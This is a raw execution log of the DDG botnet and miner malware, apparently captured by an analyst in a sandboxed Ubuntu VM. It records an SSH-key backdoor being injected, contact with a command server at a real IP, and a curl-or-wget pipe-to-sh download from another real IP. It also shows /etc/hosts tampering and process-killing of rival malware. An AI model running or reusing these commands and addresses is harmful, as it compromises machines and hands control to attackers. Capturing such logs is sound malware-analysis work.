nohup: 忽略输入
I0615 12:27:41.691108   17737 backdoor.go:61] inject ssh key successfully
I0615 12:29:11.695420   17737 utils.go:170] seedDynamic: 
I0615 12:36:31.693846   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:36:31.693910   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:36:31.693936   17737 report.go:46] empty baselist
I0615 12:36:32.162191   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:36:32.178289   17737 cmd_sh.go:17] &{Base:{Id:1 Version:-1 Timeout:5s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Line:uptime}
I0615 12:36:32.184373   17737 cmd_sh.go:17] &{Base:{Id:850 Version:-1 Timeout:10m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Line:echo -e "\n0.0.0.0 pastebin.com\n0.0.0.0 thyrsi.com\n0.0.0.0 tor2web.io\n0.0.0.0 gitee.com\n0.0.0.0 w.21-3n.xyz\n0.0.0.0 w.3ei.xyz\n0.0.0.0 aptgetgxqs3secda.onion.ly\n0.0.0.0 aptgetgxqs3secda.onion.pet\n0.0.0.0 aptgetgxqs3secda.tor2web.fyi\n0.0.0.0 aptgetgxqs3secda.onion.in.net\n0.0.0.0 rapid7cpfqnwxodo.tor2web.fyi\n0.0.0.0 rapid7cpfqnwxodo.onion.in.net\n0.0.0.0 rapid7cpfqnwxodo.onion.ly\n0.0.0.0 rapid7cpfqnwxodo.onion.pet\n0.0.0.0 intelbagjop7nzm5.tor2web.io\n0.0.0.0 intelbagjop7nzm5.d2web.org\n0.0.0.0 intelbagjop7nzm5.onion.in.net\n0.0.0.0 intelbagjop7nzm5.onion.glass\n0.0.0.0 intelbagjop7nzm5.onion.mn\n0.0.0.0 intelbagjop7nzm5.onion.sh\n0.0.0.0 intelbagjop7nzm5.onion.to\n" >> /etc/hosts}
I0615 12:36:32.187541   17737 cmd_sh.go:17] &{Base:{Id:854 Version:-1 Timeout:2m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Line:(curl -fsSL http://103.219.112.66:8000/i.sh||wget -q -O- http://103.219.112.66:8000/i.sh) | sh}
I0615 12:36:32.215255   17737 cmd_sh.go:17] &{Base:{Id:868 Version:-1 Timeout:1m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Line:sed -i "/ [jkl].ntp.direct/d" /etc/hosts && echo -e "\n202.182.108.88 j.ntp.direct\n119.9.76.107 l.ntp.direct" >> /etc/hosts}
I0615 12:36:32.257727   17737 cmd_killer.go:19] &{Base:{Id:818 Version:-1 Timeout:1m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Expr:/tmp/ddgs.(3011|3012|3013|3014|3015|3016|3017|3018|3019|3020|3021|3022)}
I0615 12:36:32.260464   17737 cmd_killer.go:49] /sbin/init splash
I0615 12:36:32.260518   17737 cmd_killer.go:49] 
I0615 12:36:32.260558   17737 cmd_killer.go:49] 
I0615 12:36:32.260597   17737 cmd_killer.go:49] 
I0615 12:36:32.260639   17737 cmd_killer.go:49] 
I0615 12:36:32.260687   17737 cmd_killer.go:49] 
I0615 12:36:32.260740   17737 cmd_killer.go:49] 
I0615 12:36:32.260780   17737 cmd_killer.go:49] 
I0615 12:36:32.260819   17737 cmd_killer.go:49] 
I0615 12:36:32.260858   17737 cmd_killer.go:49] 
I0615 12:36:32.260898   17737 cmd_killer.go:49] 
I0615 12:36:32.260937   17737 cmd_killer.go:49] 
I0615 12:36:32.260976   17737 cmd_killer.go:49] 
I0615 12:36:32.261015   17737 cmd_killer.go:49] 
I0615 12:36:32.261053   17737 cmd_killer.go:49] 
I0615 12:36:32.261092   17737 cmd_killer.go:49] 
I0615 12:36:32.261138   17737 cmd_killer.go:49] 
I0615 12:36:32.261177   17737 cmd_killer.go:49] 
I0615 12:36:32.261226   17737 cmd_killer.go:49] 
I0615 12:36:32.261267   17737 cmd_killer.go:49] 
I0615 12:36:32.261306   17737 cmd_killer.go:49] 
I0615 12:36:32.261357   17737 cmd_killer.go:49] 
I0615 12:36:32.261396   17737 cmd_killer.go:49] 
I0615 12:36:32.261448   17737 cmd_killer.go:49] 
I0615 12:36:32.261496   17737 cmd_killer.go:49] 
I0615 12:36:32.261535   17737 cmd_killer.go:49] 
I0615 12:36:32.261574   17737 cmd_killer.go:49] 
I0615 12:36:32.261617   17737 cmd_killer.go:49] 
I0615 12:36:32.261658   17737 cmd_killer.go:49] 
I0615 12:36:32.261696   17737 cmd_killer.go:49] 
I0615 12:36:32.261735   17737 cmd_killer.go:49] 
I0615 12:36:32.261774   17737 cmd_killer.go:49] 
I0615 12:36:32.261812   17737 cmd_killer.go:49] 
I0615 12:36:32.261850   17737 cmd_killer.go:49] 
I0615 12:36:32.261888   17737 cmd_killer.go:49] 
I0615 12:36:32.261926   17737 cmd_killer.go:49] 
I0615 12:36:32.261966   17737 cmd_killer.go:49] 
I0615 12:36:32.262013   17737 cmd_killer.go:49] 
I0615 12:36:32.262053   17737 cmd_killer.go:49] 
I0615 12:36:32.265677   17737 cmd_killer.go:49] 
I0615 12:36:32.265873   17737 cmd_killer.go:49] 
I0615 12:36:32.265998   17737 cmd_killer.go:49] 
I0615 12:36:32.266119   17737 cmd_killer.go:49] 
I0615 12:36:32.266644   17737 cmd_killer.go:49] 
I0615 12:36:32.266767   17737 cmd_killer.go:49] 
I0615 12:36:32.267072   17737 cmd_killer.go:49] /lib/systemd/systemd-journald
I0615 12:36:32.267536   17737 cmd_killer.go:49] /lib/systemd/systemd-udevd
I0615 12:36:32.267880   17737 cmd_killer.go:49] 
I0615 12:36:32.268002   17737 cmd_killer.go:49] 
I0615 12:36:32.268400   17737 cmd_killer.go:49] /usr/sbin/cron -f
I0615 12:36:32.268535   17737 cmd_killer.go:49] /usr/sbin/acpid
I0615 12:36:32.268671   17737 cmd_killer.go:49] avahi-daemon: running [mingming.local]
I0615 12:36:32.269013   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
I0615 12:36:32.269168   17737 cmd_killer.go:49] avahi-daemon: chroot helper
I0615 12:36:32.269784   17737 cmd_killer.go:49] /usr/sbin/NetworkManager --no-daemon
I0615 12:36:32.269975   17737 cmd_killer.go:49] /usr/lib/accountsservice/accounts-daemon
I0615 12:36:32.270228   17737 cmd_killer.go:49] /usr/sbin/rsyslogd -n
I0615 12:36:32.270414   17737 cmd_killer.go:49] /lib/systemd/systemd-logind
I0615 12:36:32.270558   17737 cmd_killer.go:49] /usr/lib/policykit-1/polkitd --no-debug
I0615 12:36:32.270869   17737 cmd_killer.go:49] /usr/sbin/lightdm
I0615 12:36:32.271058   17737 cmd_killer.go:49] /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
I0615 12:36:32.267373   17737 cmd_killer.go:19] &{Base:{Id:875 Version:-1 Timeout:1m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Expr:/tmp/(6Tx3Wq|vTtHH|vTtHH1|HT8sUy71|HT8s716|SzdXM|Jonason)}
I0615 12:36:32.271581   17737 cmd_killer.go:49] /sbin/agetty --noclear tty1 linux
I0615 12:36:32.277266   17737 cmd_killer.go:49] lightdm --session-child 12 19
I0615 12:36:32.277326   17737 cmd_killer.go:49] /usr/lib/rtkit/rtkit-daemon
I0615 12:36:32.277375   17737 cmd_killer.go:49] /usr/lib/upower/upowerd
I0615 12:36:32.277423   17737 cmd_killer.go:49] /usr/lib/colord/colord
I0615 12:36:32.277473   17737 cmd_killer.go:49] /lib/systemd/systemd --user
I0615 12:36:32.277532   17737 cmd_killer.go:49] (sd-pam)
I0615 12:36:32.277597   17737 cmd_killer.go:49] /usr/bin/gnome-keyring-daemon --daemonize --login
I0615 12:36:32.277645   17737 cmd_killer.go:49] /sbin/upstart --user
I0615 12:36:32.278013   17737 cmd_killer.go:49] /usr/bin/VBoxClient --display
I0615 12:36:32.278085   17737 cmd_killer.go:49] /usr/bin/VBoxClient --display
I0615 12:36:32.278139   17737 cmd_killer.go:49] /usr/bin/VBoxClient --seamless
I0615 12:36:32.278191   17737 cmd_killer.go:49] upstart-udev-bridge --daemon --user
I0615 12:36:32.278240   17737 cmd_killer.go:49] dbus-daemon --fork --session --address=unix:abstract=/tmp/dbus-HUyAYIxVMy
I0615 12:36:32.278290   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/hud/window-stack-bridge
I0615 12:36:32.278338   17737 cmd_killer.go:49] upstart-dbus-bridge --daemon --system --user --bus-name system
I0615 12:36:32.278387   17737 cmd_killer.go:49] upstart-dbus-bridge --daemon --session --user --bus-name session
I0615 12:36:32.278447   17737 cmd_killer.go:49] upstart-file-bridge --daemon --user
I0615 12:36:32.278585   17737 cmd_killer.go:49] /usr/bin/fcitx
I0615 12:36:32.278639   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --config-file /usr/share/fcitx/dbus/daemon.conf
I0615 12:36:32.278687   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/bamf/bamfdaemon
I0615 12:36:32.278737   17737 cmd_killer.go:49] /usr/bin/fcitx-dbus-watcher unix:abstract=/tmp/dbus-lFSqr653c0,guid=89d5f08134b26815394140b85ce4d4c4 1649
I0615 12:36:32.278791   17737 cmd_killer.go:49] /usr/lib/at-spi2-core/at-spi-bus-launcher
I0615 12:36:32.278843   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
I0615 12:36:32.278892   17737 cmd_killer.go:49] /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
I0615 12:36:32.278940   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd
I0615 12:36:32.278987   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-fuse /run/user/0/gvfs -f -o big_writes
I0615 12:36:32.279038   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/notify-osd
I0615 12:36:32.279087   17737 cmd_killer.go:49] gpg-agent --homedir /root/.gnupg --use-standard-socket --daemon
I0615 12:36:32.279135   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/hud/hud-service
I0615 12:36:32.279181   17737 cmd_killer.go:49] /usr/lib/unity-settings-daemon/unity-settings-daemon
I0615 12:36:32.279229   17737 cmd_killer.go:49] /usr/lib/gnome-session/gnome-session-binary --session=ubuntu
I0615 12:36:32.279279   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity/unity-panel-service
I0615 12:36:32.279327   17737 cmd_killer.go:49] /usr/lib/dconf/dconf-service
I0615 12:36:32.279374   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-messages/indicator-messages-service
I0615 12:36:32.279421   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
I0615 12:36:32.279468   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-power/indicator-power-service
I0615 12:36:32.279519   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-datetime/indicator-datetime-service
I0615 12:36:32.279567   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
I0615 12:36:32.279617   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-sound/indicator-sound-service
I0615 12:36:32.279665   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-printers/indicator-printers-service
I0615 12:36:32.279712   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-session/indicator-session-service
I0615 12:36:32.279850   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-application/indicator-application-service
I0615 12:36:32.279901   17737 cmd_killer.go:49] /usr/lib/geoclue/geoclue-master
I0615 12:36:32.279949   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-source-registry
I0615 12:36:32.279997   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/ubuntu-geoip-provider
I0615 12:36:32.280044   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory
I0615 12:36:32.280095   17737 cmd_killer.go:49] /usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1
I0615 12:36:32.289764   17737 cmd_killer.go:49] nm-applet
I0615 12:36:32.289868   17737 cmd_killer.go:49] /usr/lib/unity-settings-daemon/unity-fallback-mount-helper
I0615 12:36:32.289956   17737 cmd_killer.go:49] nautilus -n
I0615 12:36:32.290032   17737 cmd_killer.go:49] /usr/bin/gnome-software --gapplication-service
I0615 12:36:32.290277   17737 cmd_killer.go:49] compiz
I0615 12:36:32.290865   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-udisks2-volume-monitor
I0615 12:36:32.290941   17737 cmd_killer.go:49] /usr/lib/udisks2/udisksd --no-debug
I0615 12:36:32.291018   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-mtp-volume-monitor
I0615 12:36:32.291210   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-goa-volume-monitor
I0615 12:36:32.291284   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-afc-volume-monitor
I0615 12:36:32.291595   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-gphoto2-volume-monitor
I0615 12:36:32.291765   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory-subprocess --factory local --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.Calendarx1982x2 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/Calendar/1982/2
I0615 12:36:32.292282   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory-subprocess --factory contacts --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.Calendarx1982x3 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/Calendar/1982/3
I0615 12:36:32.292417   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-addressbook-factory
I0615 12:36:32.292552   17737 cmd_killer.go:49] fcitx-qimpanel
I0615 12:36:32.292804   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-addressbook-factory-subprocess --factory local --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.AddressBookx2168x2 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/AddressBook/2168/2
I0615 12:36:32.292938   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-trash --spawner :1.7 /org/gtk/gvfs/exec_spaw/0
I0615 12:36:32.293374   17737 cmd_killer.go:49] 
I0615 12:36:32.293503   17737 cmd_killer.go:49] zeitgeist-datahub
I0615 12:36:32.293634   17737 cmd_killer.go:49] /bin/sh -c /usr/lib/i386-linux-gnu/zeitgeist/zeitgeist-maybe-vacuum; /usr/bin/zeitgeist-daemon
I0615 12:36:32.293760   17737 cmd_killer.go:49] /usr/bin/zeitgeist-daemon
I0615 12:36:32.291153   17737 cmd_killer.go:49] /sbin/init splash
I0615 12:36:32.294678   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/zeitgeist-fts
I0615 12:36:32.294944   17737 cmd_killer.go:49] /sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-enp0s3.pid -lf /var/lib/NetworkManager/dhclient-60135289-a78e-332e-8738-3faf9606cf58-enp0s3.lease -cf /var/lib/NetworkManager/dhclient-enp0s3.conf enp0s3
I0615 12:36:32.295075   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/deja-dup/deja-dup-monitor
I0615 12:36:32.295320   17737 cmd_killer.go:49] deja-dup --prompt
I0615 12:36:32.295450   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-network --spawner :1.7 /org/gtk/gvfs/exec_spaw/1
I0615 12:36:32.295577   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-dnssd --spawner :1.7 /org/gtk/gvfs/exec_spaw/3
I0615 12:36:32.295702   17737 cmd_killer.go:49] bash
I0615 12:36:32.294807   17737 cmd_killer.go:49] 
I0615 12:36:32.296533   17737 cmd_killer.go:49] /usr/lib/gnome-terminal/gnome-terminal-server
I0615 12:36:32.296794   17737 cmd_killer.go:49] bash
I0615 12:36:32.297030   17737 cmd_killer.go:49] /usr/bin/whoopsie -f
I0615 12:36:32.297153   17737 cmd_killer.go:49] 
I0615 12:36:32.297278   17737 cmd_killer.go:49] /usr/sbin/cupsd -l
I0615 12:36:32.297396   17737 cmd_killer.go:49] 
I0615 12:36:32.298381   17737 cmd_killer.go:49] /usr/lib/cups/notifier/dbus dbus://
I0615 12:36:32.298513   17737 cmd_killer.go:49] wireshark-gtk
I0615 12:36:32.298631   17737 cmd_killer.go:49] 
I0615 12:36:32.298747   17737 cmd_killer.go:49] 
I0615 12:36:32.298969   17737 cmd_killer.go:49] 
I0615 12:36:32.299086   17737 cmd_killer.go:49] 
I0615 12:36:32.299200   17737 cmd_killer.go:49] 
I0615 12:36:32.299317   17737 cmd_killer.go:49] 
I0615 12:36:32.299567   17737 cmd_killer.go:49] 
I0615 12:36:32.299685   17737 cmd_killer.go:49] 
I0615 12:36:32.300175   17737 cmd_killer.go:49] /usr/bin/dumpcap -n -i enp0s3 -y EN10MB -Z none
I0615 12:36:32.300304   17737 cmd_killer.go:49] ./ddgs_4005.i686 -log_dir /tmp/ -alsologtostderr -v 3
I0615 12:36:32.300422   17737 cmd_killer.go:49] 
I0615 12:36:32.300547   17737 cmd_killer.go:49] tail -f ddg.log
I0615 12:36:32.296653   17737 cmd_killer.go:49] 
I0615 12:36:32.300932   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity-scope-home/unity-scope-home
I0615 12:36:32.301670   17737 cmd_killer.go:49] /usr/bin/unity-scope-loader applications/applications.scope applications/scopes.scope commands.scope
I0615 12:36:32.301796   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity-lens-files/unity-files-daemon
I0615 12:36:32.301933   17737 cmd_killer.go:49] auditd
I0615 12:36:32.302182   17737 cmd_killer.go:49] gdb asvfxg 25818
I0615 12:36:32.301542   17737 cmd_killer.go:49] 
I0615 12:36:32.302824   17737 cmd_killer.go:49] 
I0615 12:36:32.302937   17737 cmd_killer.go:49] 
I0615 12:36:32.303048   17737 cmd_killer.go:49] 
I0615 12:36:32.303157   17737 cmd_killer.go:49] 
I0615 12:36:32.303381   17737 cmd_killer.go:49] 
I0615 12:36:32.303492   17737 cmd_killer.go:49] 
I0615 12:36:32.303603   17737 cmd_killer.go:49] 
I0615 12:36:32.303714   17737 cmd_killer.go:49] 
I0615 12:36:32.304613   17737 cmd_killer.go:49] 
I0615 12:36:32.304735   17737 cmd_killer.go:49] 
I0615 12:36:32.304847   17737 cmd_killer.go:49] 
I0615 12:36:32.304958   17737 cmd_killer.go:49] 
I0615 12:36:32.305068   17737 cmd_killer.go:49] 
I0615 12:36:32.305285   17737 cmd_killer.go:49] 
I0615 12:36:32.305400   17737 cmd_killer.go:49] 
I0615 12:36:32.305511   17737 cmd_killer.go:49] 
I0615 12:36:32.305621   17737 cmd_killer.go:49] 
I0615 12:36:32.305857   17737 cmd_killer.go:49] 
I0615 12:36:32.306399   17737 cmd_killer.go:49] 
I0615 12:36:32.306516   17737 cmd_killer.go:49] 
I0615 12:36:32.306629   17737 cmd_killer.go:49] 
I0615 12:36:32.306740   17737 cmd_killer.go:49] 
I0615 12:36:32.306850   17737 cmd_killer.go:49] 
I0615 12:36:32.307157   17737 cmd_killer.go:49] 
I0615 12:36:32.307272   17737 cmd_killer.go:49] 
I0615 12:36:32.307665   17737 cmd_killer.go:49] 
I0615 12:36:32.307778   17737 cmd_killer.go:49] 
I0615 12:36:32.307888   17737 cmd_killer.go:49] 
I0615 12:36:32.307997   17737 cmd_killer.go:49] 
I0615 12:36:32.308107   17737 cmd_killer.go:49] 
I0615 12:36:32.308879   17737 cmd_killer.go:49] 
I0615 12:36:32.308992   17737 cmd_killer.go:49] 
I0615 12:36:32.309104   17737 cmd_killer.go:49] 
I0615 12:36:32.309215   17737 cmd_killer.go:49] 
I0615 12:36:32.309403   17737 cmd_killer.go:49] 
I0615 12:36:32.309776   17737 cmd_killer.go:49] 
I0615 12:36:32.309887   17737 cmd_killer.go:49] 
I0615 12:36:32.309996   17737 cmd_killer.go:49] 
I0615 12:36:32.310801   17737 cmd_killer.go:49] 
I0615 12:36:32.310915   17737 cmd_killer.go:49] 
I0615 12:36:32.311025   17737 cmd_killer.go:49] 
I0615 12:36:32.311146   17737 cmd_killer.go:49] /lib/systemd/systemd-journald
I0615 12:36:32.311268   17737 cmd_killer.go:49] /lib/systemd/systemd-udevd
I0615 12:36:32.311494   17737 cmd_killer.go:49] 
I0615 12:36:32.311605   17737 cmd_killer.go:49] 
I0615 12:36:32.311729   17737 cmd_killer.go:49] /usr/sbin/cron -f
I0615 12:36:32.311854   17737 cmd_killer.go:49] /usr/sbin/acpid
I0615 12:36:32.312085   17737 cmd_killer.go:49] avahi-daemon: running [mingming.local]
I0615 12:36:32.312627   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
I0615 12:36:32.312778   17737 cmd_killer.go:49] avahi-daemon: chroot helper
I0615 12:36:32.312904   17737 cmd_killer.go:49] /usr/sbin/NetworkManager --no-daemon
I0615 12:36:32.313022   17737 cmd_killer.go:49] /usr/lib/accountsservice/accounts-daemon
I0615 12:36:32.313343   17737 cmd_killer.go:49] /usr/sbin/rsyslogd -n
I0615 12:36:32.313462   17737 cmd_killer.go:49] /lib/systemd/systemd-logind
I0615 12:36:32.314109   17737 cmd_killer.go:49] /usr/lib/policykit-1/polkitd --no-debug
I0615 12:36:32.314236   17737 cmd_killer.go:49] /usr/sbin/lightdm
I0615 12:36:32.314356   17737 cmd_killer.go:49] /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
I0615 12:36:32.314476   17737 cmd_killer.go:49] /sbin/agetty --noclear tty1 linux
